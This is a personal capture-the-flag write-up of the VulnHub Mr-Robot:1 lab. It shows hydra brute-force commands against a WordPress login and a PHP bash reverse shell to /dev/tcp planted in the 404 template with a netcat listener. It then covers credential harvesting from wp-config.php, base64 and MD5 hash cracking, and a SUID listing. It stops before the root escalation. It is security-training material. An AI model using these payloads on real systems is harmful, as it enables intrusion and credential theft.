| Stat       | Value                                        |
| ---------- | -------------------------------------------- |
| Room       | MR-ROBOT: 1                                  |
| URL        | https://www.vulnhub.com/entry/mr-robot-1,151 |
| Difficulty | Easy                                         |

## Concepts/Tools Used

- nmap
- Burp Suite
- dirb
- hydra
- netcat
- SUID/GTFOBins
- CrackStation

## Description

This was the first capture the flag challenge that I tried. I have never watched the show Mr. Robot before so most of the references are lost on me. The challenge follows the standard flow of scanning, looking for vulnerabilites and then exploiting them. I was learning what needs to be done while I was doing this capture the flag challenge. I would come up with ideas and run them, once I got stuck I started to watch videos to get ideas on what other people did.

### Process

#### Setup

I imported the virtual machine image into virtual box and booted it up.

#### Port and Service Scan

There is a login screen but I don't have a username or password. I tried admin/admin and root/root but that didn't work.

From here I knew that I needed to get the ip address of the machine so that I could scan it and find out what services were on the machine. When I setup my home lab I limited the ip addresses to the range of 10.22.1.110-130. So I ran the following command to find the machine:

`nmap -sS 10.22.1.110-130`

It provided output for 2 machines. One of the machines was mine (10.22.1.110) so I ignored the output from that machine. The other machine was the target machine. The machine has 3 ports open:

- 22/tcp
- 80/tcp
- 443/tcp

I can use a password to ssh onto the machine since a password prompt showed up when I ran the following command:

`ssh 10.22.1.112`

This lets me know that I can try to brute force login with hydra if I find a username.

#### Website Enumeration

Since I don't have much other information, I opened up Firefox and checked out the website that was running on the target machine.

I viewed the various pages on the website and viewed the page source. I didn't see anything that stood out. None of the links looked particularly promising either.

From here I needed to run some directory enumeration to get more information. I ran the following:

`dirb http://10.22.1.112`

#### First Key

The output mentioned a few things. I started out with the robots.txt file to see what directories are available that they don't want indexed. The output was the following:

```txt
User-agent: *
fsociety.dic
key-1-of-3.txt
```

Nice! I found the first key! I opened that file in Firefox using the following url:

`http://10.22.1.112/key-1-of-3.txt`

#### Provided Word List

Finding the first key file means that the fsociety.dic file is important. I grabbed that file in Firefox using the following url:

`http://10.22.1.112/fsociety.dic`

This file is a giant word list. I downloaded the file and ran the following command on it to see how big it was:

`wc -l fsociety.dic`

The file is over 800k lines. I wanted to see if there were duplicates. I ran the following command:

`uniq fsociety.dic | wc -l`

There are only about 11k unique lines in this file. With that in mind, I saved a copy of the file with just the unique lines using the following command:

`uniq fsociety.dic > test.txt`

#### Admin Login Form

At this point, I have a shorted dictionary list and more things that dirb had in the output. I see that one of the things dirb wanted me to check was the `admin/` path. I'll go there next. The url is:

`http://10.22.1.112/admin`

I went to the page and I am not sure what is happening. It feels like the page is redirecting over and over. I am going to leave this page and check out another directory that dirb wanted me to check. The url is:

`http://10.22.1.112/wp-login.php`

I see a login page and I started to try a few different combinations:

- admin/admin
- admin/password
- admin/123
- admin/1234
- admin/123456

None of these worked. I did notice that the error message doesn't give a generic "your username and password are incorrect" error message. It tells me "Invalid username. Lost your password?". I got the same error message when I tried a few different usernames. If I provide a correct username do I get a different message? So far the only information that I have is the dictionary file that I shortened earlier. I watch the login attempt in the Firefox developer toolbar so I can see the request. Since we have 11k lines in the dictionary file, I don't want to use Burp Suite since it throttles my brute force attempts. I want to use hydra. The command that I used is the following:

`hydra -L test.txt -p admin 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'

Here is a summary of what is happening:
- The `-L` option lets hydra know that I want to use a word list of usernames.
- The `-p` option lets hydra know that I want to use admin as the password.
- 10.22.1.112 is the ip address where hydra is making the request.
- Hydra is making a http-post-form request. This is the request that is made when we type a username and password at the admin login page in Firefox.
- The http-post-form uses a string as input. It has 3 parts that are separated by the colon (:) character.
- The path of the request: `/wp-login.php`.
- The form data. In our case we have 3 items. The ^USER^ variable will be populated by the word list mentioned above. The ^PASS^ variable will be admin. The wp-submit variable will be Log+In.
- Finally, the `F=Invalid username` part tells hydra that a failed request will have the string "Invalid username" in the response.

After running the command I got a valid username:

`Elliot`

Now that we have the username we need a password. I tried 2 things at once. I ran hydra with the username Elliot and the same word list that I was provided while I looked at some of the other results from dirb. I also took another look at the website pages again to see if there was anything I missed. It didn't take long for hydra to provide the password. Here is the hydra command that I ran:

`hydra -l Elliot -P test.txt 10.22.1.112 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'

Here is a summary of what is happening:
- The `-l` option lets hydra know that I want to use Elliot as the username.
- The `-P` option lets hydra know that I want to use a word list of passwords.
- 10.22.1.112 is the ip address where hydra is making the request.
- Hydra is making a http-post-form request. This is the request that is made when we type a username and password at the admin login page in Firefox.
- The http-post-form uses a string as input. It has 3 parts that are separated by the colon (:) character.
- The path of the request: `/wp-login.php`.
- The form data. In our case we have 3 items. The ^USER^ variable will be Elliot. The ^PASS^ variable will be populated by the word list mentioned above. The wp-submit variable will be Log+In.
- Finally, the `F=is incorrect` part tells hydra that a failed request will have the string "is incorrect" in the response.

Running this command did provide the password. I have redacted the password but I wanted to show the following output from hydra:

```bash
[80][http-post-form] host: 10.22.1.112   login: Elliot   password: REDACTED
1 of 1 target successfully completed, 1 valid password found
```

#### Website Admin

I looked around in the admin trying to find usernames and passwords. Nothing was showing up. I even tried connecting to the box using ssh with the username Elliot and the password just found.

I couldn't find anything that stood out. I was very confused about what to do.

As mentioned before, this capture the flag event was my first one ever. I had no idea what to do once you got into a website admin portal. The next part was information that I found in a video and it blew my mind.

#### Remote Access on Target

It has been a while since I used PHP but I knew that some commands are dangerous to use. I learned that you could use the PHP exec function to create a shell session that connects to the attack machine. For anyone that doesn't know, PHP will execute code on the webserver and then return the rendered HTML as a response to the client. Any PHP code is executed on the server and the results of that code are returned as HTML.

Here is the PHP code we are going to use:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.22.1.110/4444 0>&1'"); ?>
```

This code will do the following:

- Create a bash terminal
- Connect to the ip address 10.22.1.110 (my attack box's ip address)
- Connect to port 4444 of my attack box
- It is going to create this shell as whatever user is running the PHP site

That is the payload I am going to use. I need to make sure that my machine is listening on port 4444. I do that with the following command:

`nc -lvnp 4444`

Here is a breakdown of this command:

- `nc` is the tool netcat. It is used to connect and listen on ports of machines. It can do a lot of useful things.
- The `-l` option tells netcat that it is listening for a connection rather than creating a connection.
- The `-v` option (I know it doesn't have a dash above but that is shorthand) makes sure that we get verbose output.
- The `-n` option tells netcat to suppress name and host resolutions.
- The `-p` option tells netcat what port it is going to listen on and wait for connections.

Now that my attack machine is listening for a connection, I just need to execute the PHP code mentioned above. I need to add the code to a template in the WordPress admin site. I could create a new page or just add it to an existing page. I chose to add the code to the 404.php template. It is very easy to generate a 404 error on a site. I inserted the code at the top of the 404.php template and saved the template.

Now I triggered a 404 error on the website. Here is the url I used:

`http://10.22.1.112/a;a;`

My listening terminal now has the following at the bottom:

```bash
daemon@linux:/opt/binami/apps/wordpress/htdocs$
```

In other words, my listening terminal now has a connection!

#### Have a Look Around

Now that I have access to a machine, I need to gather more information. Here are some questions that I am going to answer:

- Who am I running as?
- What permissions do I have?
- What other users are in the /home directory?
- What interesting files do I have access to?

I am running as the user daemon. When I run the `ls` command, I see that there is a file called wp-config.php. I used the following command to view the contents of that file:

`cat wp-config.php`

There are a lot of interesting things in this file. There are credentials for a database user and an ftp user. I noted that information in case I need to go down that path.

I also like the text of the license.txt file. I ran the command `cat license.txt` on it and got the following text:

```
do you want a password or something?
ZWxsaW90OkVSMjgtMDY1Mgo=
```

That string is base64 encoded. When I decode it, I get the username and password that I got when I logged into the WordPress admin. I used [CyberChef](https://gchq.github.io/CyberChef/) to base64 decode the string. I don't know if the machine has the base64 command on it. If it does I could have also decoded it by typing:

`echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d `

Time to look in other places.

I ran `ls /home` to see what other users are on the machine. There is a user called robot that we can use. I ran `ls -lha /home/robot` and there are a could of important files that show up:

- key-2-of-3.txt
- password.raw-md5

The key file is owned by the user robot and only robot can read the file. This is telling me that I need to use the password.raw-md5 file to get the robot user's password so that I can login as robot.

#### User Privilege Escalation

I was able to cat the password.raw-md5 file:

`cat password.raw-md5`

I saw the following:

`robot:c3fcd3d76192e4007dfb496cca67e13b`

I used [CrackStation](https://crackstation.net/) to crack that md5 hash. It provided the password for the robot user.

On my attack machine, I ran the following command to login as the robot user:

`ssh robot@10.22.1.112`

I then entered that password that CrackStation gave me. Just like that, I now have a shell on the machine as the robot user. I closed my other shell window.

I didn't actually need to close my original shell. I could have just generated a more stable shell. The steps that I use can be [found here](../../README.md#stable-shell).

Either way, now that I am the robot user I can read the flag in the `key-2-of-3.txt` file.

#### Root User Privilege Escalation

Now I need to try to get the root user. I can grab a linpeas.sh script and run that to find vulnerabilities. I'll manually check a few things first. Here is the list:

- Run the `id` command to see what groups I am in. Nothing stands out,
- Run the `sudo su` command to see if I can be root with just my password. That did not work.
- Run the `sudo -l` command to see what privileges I have. Nothing stands out.
- Check the `/opt`, `/tmp` and `/var` directories to see if anything stands out. It didn't.
- Run the `find / -perm /4000 -type f 2>/dev/null` command to get a list of all files that have the SUID bit set. Here is the list:

```bash
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
